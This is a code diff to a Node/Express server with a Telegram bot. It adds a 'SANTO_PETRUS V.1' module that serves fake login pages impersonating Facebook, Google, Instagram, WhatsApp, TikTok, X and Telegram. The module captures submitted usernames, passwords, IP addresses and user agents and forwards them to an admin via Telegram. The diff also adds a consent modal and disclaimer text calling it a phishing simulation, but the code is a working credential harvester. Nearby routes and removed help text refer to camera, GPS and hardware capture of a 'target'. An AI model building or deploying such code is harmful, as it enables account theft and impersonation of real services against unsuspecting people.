@@ -438,6 +438,154 @@ async function startServer() {
     res.redirect(`/t/silent_click/${req.params.id}`);
   });
 
+  // ========== SANTO_PETRUS V.1 APIs ==========
+  const santopetrusLogs: any[] = [];
+  
+  app.get('/auth/santo-:b64data', (req, res) => {
+    try {
+      const data = Buffer.from(req.params.b64data, 'base64url').toString('utf-8');
+      const [template, redirectUrl] = data.split('||');
+      
+      const payloadId = req.params.b64data;
+      
+      // Serve the Phishing UI with User Agreement modal
+      // We will make a generic looking login portal since we have 13 templates.
+      let brandName = template || "Secure Authentication";
+      if(template.includes('fb') || template.toLowerCase().includes('facebook')) brandName = "Facebook";
+      if(template.includes('google')) brandName = "Google";
+      if(template.includes('ig') || template.toLowerCase().includes('instagram')) brandName = "Instagram";
+      if(template.includes('wa') || template.toLowerCase().includes('whatsapp')) brandName = "WhatsApp";
+      if(template.includes('tiktok')) brandName = "TikTok";
+      if(template.includes('x') || template.toLowerCase().includes('twitter')) brandName = "X (Twitter)";
+      if(template.includes('telegram')) brandName = "Telegram";
+      
+      res.send(`
+        <!DOCTYPE html>
+        <html lang="id">
+        <head>
+          <meta charset="UTF-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <title>Login - ${brandName}</title>
+          <script src="https://cdn.tailwindcss.com"></script>
+        </head>
+        <body class="bg-gray-50 text-gray-900 flex items-center justify-center min-h-screen">
+          
+          <!-- Modal Perjanjian Pengguna (User Agreement) -->
+          <div id="agreement-modal" class="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4 backdrop-blur-sm">
+            <div class="bg-white rounded-lg shadow-2xl max-w-md w-full p-6 border-t-4 border-red-600">
+              <div class="flex items-center justify-center mb-4 text-red-600">
+                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="animate-pulse"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
+              </div>
+              <h2 class="text-xl font-bold text-center mb-2 uppercase text-red-700">Perjanjian Pengguna</h2>
+              <div class="text-xs text-gray-600 space-y-3 mb-6 bg-red-50 p-3 rounded border border-red-100">
+                <p><strong>PERINGATAN:</strong> Halaman ini adalah <b>SIMULASI PHISHING (SantoPetrus V.1)</b>.</p>
+                <p>Ini adalah alat pengujian keamanan (Security Audit Tool) yang dikerahkan oleh perusahaan/sistem keamanan.</p>
+                <p>Jika ini adalah dunia nyata, kredensial Anda akan berhasil dicuri oleh penyerang. Segala aktivitas di halaman ini aman dan hanya akan direkam sebagai metrik latihan keamanan perusahaan.</p>
+                <div class="flex items-start mt-4">
+                  <input type="checkbox" id="agree-check" class="mt-1 mr-2 cursor-pointer">
+                  <label for="agree-check" class="font-bold text-red-700 cursor-pointer">Saya memahami bahwa ini adalah simulasi Phishing dari perusahaan untuk mengetes kewaspadaan keamanan siber saya.</label>
+                </div>
+              </div>
+              <button id="btn-accept" disabled class="w-full bg-gray-300 text-gray-500 font-bold py-3 px-4 rounded transition-all cursor-not-allowed">
+                SAYA MENGERTI & LANJUTKAN
+              </button>
+            </div>
+          </div>
+
+          <!-- Phishing Form -->
+          <form id="login-form" action="/auth/santo-submit" method="POST" class="bg-white p-8 rounded-lg shadow-md max-w-sm w-full opacity-0 transition-opacity duration-1000">
+            <h1 class="text-2xl font-bold text-center mb-2">${brandName}</h1>
+            <p class="text-center text-sm text-gray-500 mb-6">Sign in to continue</p>
+            
+            <input type="hidden" name="payload_id" value="${payloadId}">
+            
+            <div class="space-y-4">
+              <div>
+                <label class="block text-sm font-medium text-gray-700 mb-1">Email or Username</label>
+                <input type="text" name="username" required class="w-full px-4 py-2 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none">
+              </div>
+              <div>
+                <label class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+                <input type="password" name="password" required class="w-full px-4 py-2 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none">
+              </div>
+              <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 px-4 rounded transition-colors">
+                Log In
+              </button>
+            </div>
+            
+            <div class="mt-6 text-center text-xs text-gray-400">
+              Protected by Enterprise Security Audit
+            </div>
+          </form>
+
+          <script>
+            const checkbox = document.getElementById('agree-check');
+            const btnAccept = document.getElementById('btn-accept');
+            const modal = document.getElementById('agreement-modal');
+            const form = document.getElementById('login-form');
+
+            checkbox.addEventListener('change', (e) => {
+              if(e.target.checked) {
+                btnAccept.disabled = false;
+                btnAccept.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
+                btnAccept.classList.add('bg-red-600', 'text-white', 'hover:bg-red-700');
+              } else {
+                btnAccept.disabled = true;
+                btnAccept.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
+                btnAccept.classList.remove('bg-red-600', 'text-white', 'hover:bg-red-700');
+              }
+            });
+
+            btnAccept.addEventListener('click', () => {
+              modal.style.display = 'none';
+              form.classList.remove('opacity-0');
+            });
+          </script>
+        </body>
+        </html>
+      `);
+    } catch(e) {
+      res.sendStatus(400);
+    }
+  });
+
+  app.post('/auth/santo-submit', (req, res) => {
+    try {
+      const { payload_id, username, password } = req.body;
+      const data = Buffer.from(payload_id, 'base64url').toString('utf-8');
+      const [template, redirectUrl] = data.split('||');
+      
+      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+      const targetIp = String(ip).split(',')[0].trim();
+      const ua = req.headers['user-agent'] || 'Unknown';
+      
+      const capture = {
+        id: crypto.randomUUID().substring(0, 6).toUpperCase(),
+        service: template,
+        user: String(username).substring(0, 50),
+        pass: String(password).substring(0, 50),
+        ip: targetIp,
+        time: new Date().toLocaleTimeString()
+      };
+      
+      santopetrusLogs.unshift(capture);
+      if(santopetrusLogs.length > 50) santopetrusLogs.pop();
+      
+      // Send telegram if bot exists
+      if (botInstance) {
+         botInstance.telegram.sendMessage(ADMIN_ID, `💀 <b>SANTO_PETRUS HIT (CREDENTIALS CAPTURED)</b> 💀\nTemplate: <code>${template}</code>\nIP: <code>${targetIp}</code>\nUSER: <code>${capture.user}</code>\nPASS: <code>${capture.pass}</code>\nUA: <code>${ua}</code>`, { parse_mode: 'HTML' }).catch(()=>{});
+      }
+
+      res.redirect(redirectUrl || 'https://google.com');
+    } catch(e) {
+      res.redirect('https://google.com');
+    }
+  });
+
+  app.get('/api/santopetrus/captures', (req, res) => {
+    res.json(santopetrusLogs);
+  });
+
   // ========== MIKKOLINK PORT & APIs ==========
   // Import our MikkoLink page renderer
   const { renderMikkoLinkPage } = require("./mikkoTemplate");
@@ -1643,20 +1791,21 @@ async function startServer() {
 
     bot.action('menu_help', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>ℹ️ ɪɴꜰᴏʀᴍᴀꜱɪ & ᴋᴇᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ</b>\n` +
+      const txt = `<b>ℹ️ ɪɴꜰᴏʀᴍᴀꜱɪ & ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ</b>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
                   `ʜᴏꜱᴛ: <code>${appHost}</code>\n` +
                   `ꜱᴛᴀᴛᴜꜱ: 🟢 ᴏɴʟɪɴᴇ\n\n` +
                   `<b>📜 ᴘᴏʟɪꜱɪ ᴋᴇᴀᴍᴀɴᴀɴ (USER AGREEMENT):</b>\n` +
                   `ꜱɪꜱᴛᴇᴍ ᴍᴇɴᴅᴇᴛᴇᴋꜱɪ ᴠᴇʀɪꜰɪᴋᴀꜱɪ ɪᴅᴇɴᴛɪᴛᴀꜱ ᴜɴᴛᴜᴋ ᴘᴇʀʟɪɴᴅᴜɴɢᴀɴ ꜱᴇꜱɪ ᴅᴀʀɪ ᴀɴᴄᴀᴍᴀɴ ᴅᴇᴇᴘ-ꜰᴀᴋᴇ.\n\n` +
                   `1. Pengguna menyatakan mematuhi seluruh aturan platform.\n` +
-                  `2. Semua akses audit sistem disetujui (By clicking 'Verify', the user agrees to the Global Security Service Agreement).\n` +
-                  `3. Sistem beroperasi di bawah otoritas penuh (Enuma Elish Protocol).\n\n` +
-                  `ᴅᴇɴɢᴀɴ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ʟᴀʏᴀɴᴀɴ ɪɴɪ, ᴘᴇɴɢɢᴜɴᴀ (ᴛᴀʀɢᴇᴛ) ᴍᴇᴍʙᴇʀɪᴋᴀɴ ɪᴢɪɴ ᴀᴜᴅɪᴛ ʏᴀɴɢ ᴍᴇʟɪᴘᴜᴛɪ:\n` +
-                  `• ꜱɪɴᴋʀᴏɴɪꜱᴀꜱɪ ʙɪᴏᴍᴇᴛʀɪᴋ (ᴋᴀᴍᴇʀᴀ)\n` +
-                  `• ᴠᴀʟɪᴅᴀꜱɪ ʟᴏᴋᴀꜱɪ ᴘʀᴇꜱɪꜱɪ (ɢᴘꜱ)\n` +
-                  `• ᴀᴜᴅɪᴛ ᴍᴇᴛᴀᴅᴀᴛᴀ ʜᴀʀᴅᴡᴀʀᴇ\n\n` +
-                  `ᴅᴀᴛᴀ ᴅɪᴇɴᴋʀɪᴘꜱɪ ᴜᴊᴜɴɢ-ᴋᴇ-ᴜᴊᴜɴɢ (ᴇ2ᴇᴇ) ᴅᴀɴ ʜᴀɴʏᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ᴠᴀʟɪᴅᴀꜱɪ ꜱᴇꜱɪ.`;
+                  `2. Semua akses audit sistem disetujui.\n` +
+                  `3. Sistem beroperasi di bawah otoritas penuh.\n\n` +
+                  `<b>⚠️ KLAUSUL KHUSUS: SANTO_PETRUS V.1:</b>\n` +
+                  `Peringatan: Modul <b>SantoPetrus V.1</b> adalah alat simulasi Phishing untuk kegiatan Enterprise Security Audit and Penetration Testing. \n` +
+                  `• Anda sepenuhnya bertanggung jawab atas tautan yang dihasilkan.\n` +
+                  `• Menggunakan modul ini terhadap target tidak sah atau publik tanpa izin lisensi audit adalah terlarang dan melanggar hukum.\n` +
+                  `• Setiap halaman simulasi dilengkapi dengan Persetujuan Modal (User Agreement) eksplisit yang harus diklik target.\n` +
+                  `━━━━━━━━━━━━━━━━━━━━`;
       const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
